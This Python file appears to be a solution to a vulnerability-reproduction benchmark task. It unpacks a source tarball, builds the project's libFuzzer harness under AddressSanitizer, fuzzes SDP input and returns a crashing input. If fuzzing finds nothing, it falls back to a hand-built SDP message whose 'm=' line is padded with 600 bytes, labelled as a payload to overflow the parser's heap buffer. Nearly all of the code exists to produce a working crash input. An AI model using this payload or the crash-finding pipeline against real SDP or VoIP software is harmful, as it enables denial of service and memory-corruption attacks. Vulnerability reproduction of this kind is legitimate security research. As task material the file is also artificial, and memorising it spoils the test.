import os
import sys
import tarfile
import tempfile
import subprocess
import glob
import shutil

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        """
        # Create a temporary directory for all operations
        with tempfile.TemporaryDirectory() as temp_dir:
            # 1. Extract source code
            try:
                if src_path.endswith('.tar.gz') or src_path.endswith('.tgz'):
                    with tarfile.open(src_path, "r:gz") as tar:
                        tar.extractall(path=temp_dir)
                elif src_path.endswith('.tar'):
                    with tarfile.open(src_path, "r:") as tar:
                        tar.extractall(path=temp_dir)
                else:
                    with tarfile.open(src_path) as tar:
                        tar.extractall(path=temp_dir)
            except Exception:
                return self.fallback_poc()

            # 2. Locate Fuzz Harness (files containing LLVMFuzzerTestOneInput)
            harness_file = None
            candidates = []
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith((".c", ".cc", ".cpp")):
                        full_path = os.path.join(root, file)
                        try:
                            with open(full_path, 'r', errors='ignore') as f:
                                if "LLVMFuzzerTestOneInput" in f.read():
                                    candidates.append(full_path)
                        except:
                            pass
            
            # Prioritize harness related to 'sdp' or 'parser'
            if candidates:
                for c in candidates:
                    fname = os.path.basename(c).lower()
                    if "sdp" in fname or "parse" in fname:
                        harness_file = c
                        break
                if not harness_file:
                    harness_file = candidates[0]
            
            if not harness_file:
                return self.fallback_poc()

            # 3. Build Strategy
            # Try to identify project root (where Makefile is)
            build_root = temp_dir
            for root, dirs, files in os.walk(temp_dir):
                if "Makefile" in files:
                    if os.path.commonpath([root, harness_file]) == root:
                        build_root = root
                        break
            
            # Environment variables for compilation
            env = os.environ.copy()
            env["CC"] = "clang"
            env["CXX"] = "clang++"
            env["CFLAGS"] = "-fsanitize=address,fuzzer-no-link -g -O1"
            env["CXXFLAGS"] = "-fsanitize=address,fuzzer-no-link -g -O1"
            
            # Attempt 'make' to build objects
            if os.path.exists(os.path.join(build_root, "Makefile")):
                try:
                    subprocess.run(["make", "clean"], cwd=build_root, env=env, 
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.run(["make", "-j8"], cwd=build_root, env=env, 
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=180)
                except:
                    pass

            # 4. Link the fuzzer binary
            fuzzer_bin = os.path.join(temp_dir, "fuzzer_run")
            
            # Gather Include Paths
            include_dirs = set()
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith(".h"):
                        include_dirs.add(root)
            
            # Gather Objects/Libs
            # Prefer .a static libs
            libs = []
            for root, dirs, files in os.walk(temp_dir):
                for file in files:
                    if file.endswith(".a"):
                        libs.append(os.path.join(root, file))
            
            objects = []
            if not libs:
                harness_name = os.path.basename(harness_file).rsplit('.', 1)[0]
                for root, dirs, files in os.walk(temp_dir):
                    for file in files:
                        if file.endswith(".o"):
                            if harness_name in file:
                                continue
                            if "main.o" in file:
                                continue
                            objects.append(os.path.join(root, file))
            
            # Construct compilation command
            cmd = ["clang++", "-fsanitize=address,fuzzer", "-g", "-O1"]
            for inc in include_dirs:
                cmd.append(f"-I{inc}")
            
            cmd.append(harness_file)
            
            if libs:
                cmd.extend(libs)
            else:
                cmd.extend(objects)
            
            cmd.extend(["-o", fuzzer_bin])
            
            # Link
            link_success = False
            try:
                subprocess.run(cmd, cwd=build_root, check=True, 
                               stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                link_success = True
            except subprocess.CalledProcessError:
                try:
                    # Retry minimal build (harness only)
                    cmd_minimal = ["clang++", "-fsanitize=address,fuzzer", harness_file, "-o", fuzzer_bin]
                    subprocess.run(cmd_minimal, cwd=build_root, check=True,
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    link_success = True
                except:
                    pass

            if not link_success:
                return self.fallback_poc()

            # 5. Fuzzing
            # Create a dictionary to help fuzzer
            dict_path = os.path.join(temp_dir, "sdp.dict")
            with open(dict_path, "w") as f:
                f.write('v=\no=\ns=\nc=\nt=\nm=\na=\nIN\nIP4\nIP6\nRTP/AVP\n')

            # Run the fuzzer
            run_cmd = [
                fuzzer_bin, 
                "-max_total_time=45", 
                f"-dict={dict_path}", 
                "-artifact_prefix=crash-",
                "-max_len=2048"
            ]
            
            try:
                subprocess.run(run_cmd, cwd=temp_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=50)
            except subprocess.TimeoutExpired:
                pass
            
            # 6. Check for results
            crashes = glob.glob(os.path.join(temp_dir, "crash-*"))
            if crashes:
                crashes.sort(key=os.path.getsize)
                try:
                    with open(crashes[0], "rb") as f:
                        return f.read()
                except:
                    pass
            
            return self.fallback_poc()

    def fallback_poc(self) -> bytes:
        # Fallback based on SDP Heap Buffer Overflow patterns
        payload = bytearray(b"v=0\r\n")
        payload += b"o=user1 123 456 IN IP4 127.0.0.1\r\n"
        payload += b"s=Talk\r\n"
        payload += b"c=IN IP4 127.0.0.1\r\n"
        payload += b"t=0 0\r\n"
        
        # Malicious m= line to overflow parser buffer
        payload += b"m=audio 1234 RTP/AVP 0 "
        payload += b"A" * 600
        payload += b"\r\n"
        
        payload += b"a=rtpmap:0 PCMU/8000\r\n"
        payload += b"a=recvonly\r\n"
        
        return bytes(payload)